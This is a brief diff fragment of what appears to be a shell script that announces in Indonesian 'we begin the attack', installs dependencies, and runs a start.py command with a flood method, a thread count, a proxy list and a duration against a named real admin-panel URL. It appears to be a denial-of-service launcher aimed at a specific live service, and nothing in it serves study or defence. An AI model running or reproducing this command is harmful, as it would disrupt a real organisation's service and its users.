@@ -70,4 +70,3 @@ printf "\n$g$b    kita mulai penyerangan $endc$enda" >&2
 ! pip3 install -r requirements.txt
 ! python3 start.py
 ! python3 start.py ovh https://adminpanel.paxel.co 1 10000000000 proxy.txt 1000 8585
-
